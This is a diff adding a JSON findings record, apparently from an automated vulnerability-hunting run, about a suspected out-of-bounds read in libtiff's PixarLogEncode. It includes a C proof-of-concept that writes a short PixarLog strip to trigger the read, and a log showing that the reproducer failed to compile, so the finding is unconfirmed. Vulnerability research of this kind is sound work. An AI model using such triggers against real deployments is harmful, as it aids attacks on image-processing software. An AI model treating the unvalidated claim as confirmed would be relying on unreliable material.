@@ -1,0 +1,18 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "libtiff/tif_pixarlog.c",
+    "line": 1343,
+    "function": "PixarLogEncode",
+    "bug_type": "out-of-bounds-read",
+    "cwe": "CWE-125",
+    "confidence": "high",
+    "explanation": "The loop processes input in chunks of size llen (stride * imagewidth) but only checks that n <= rowsperstrip * llen. If n is not a multiple of llen (e.g., cc provides fewer bytes than a full row), the last iteration still calls horizontalDifference* with n=llen (lines 1348\u20131360), causing reads past the end of the input buffer bp. This leads to an out-of-bounds read on the final partial chunk.",
+    "abs_path": "/tmp/libtiff_upstream/libtiff/tif_pixarlog.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <tiffio.h>\n\nint main(void) {\n    const char *filename = \"pixarlog_oob.tif\";\n\n    TIFF *tif = TIFFOpen(filename, \"w\");\n    if (!tif) {\n        fprintf(stderr, \"Failed to open TIFF file for writing\\n\");\n        return 1;\n    }\n\n    uint32_t width = 10;          // imagewidth\n    uint32_t height = 1;          // imagelength (one row)\n    uint16_t spp = 1;             // samples per pixel (grayscale)\n    uint16_t bps = 8;             // 8-bit samples\n\n    // Set up a minimal grayscale image using PixarLog compression\n    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, width);\n    TIFFSetField(tif, TIFFTAG_IMAGELENGTH, height);\n    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, spp);\n    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, bps);\n    TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);\n    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_MINISBLACK);\n    TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_PIXARLOG);\n    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, (uint32_t)1);\n\n    // Provide fewer bytes than a full row to trigger the bug.\n    // llen = stride * imagewidth; with spp=1, stride is 1, so llen = 10 elements.\n    // For 8-bit input, n = cc, so choose cc = 5 < llen to force a partial chunk.\n    size_t cc = 5; // bytes provided; not a multiple of llen\n    unsigned char *buf = (unsigned char *)malloc(cc);\n    if (!buf) {\n        fprintf(stderr, \"malloc failed\\n\");\n        TIFFClose(tif);\n        return 1;\n    }\n    memset(buf, 0xAA, cc);\n\n    // This call reaches PixarLogEncode(), which will compute n=cc and llen=stride*imagewidth.\n    // Since n < llen, the loop still processes one iteration with llen, causing an OOB read\n    // from bp by (llen - n) bytes inside horizontalDifference8().\n    tmsize_t ret = TIFFWriteEncodedStrip(tif, 0, buf, (tmsize_t)cc);\n    fprintf(stderr, \"TIFFWriteEncodedStrip returned %zd\\n\", (ssize_t)ret);\n\n    free(buf);\n\n    // Close file (not strictly needed to trigger the bug, but keeps things tidy)\n    TIFFClose(tif);\n\n    fprintf(stderr, \"Wrote %s (bug should have been triggered during encoding)\\n\", filename);\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "REPRODUCER_BUILD_FAIL",
+    "compile_error": "In file included from /app/se_runs/b3/libtiff_f324415_vul/findings/tif_pixarlog_1343_out-of-bounds-read/reproducer.c:4:\nIn file included from /tmp/libtiff_upstream/libtiff/tiffio.h:31:\n/tmp/libtiff_upstream/libtiff/tiff.h:28:10: fatal error: 'tiffconf.h' file not found\n#include \"tiffconf.h\"\n         ^~~~~~~~~~~~\n1 error generated.\n"
+  }
+}
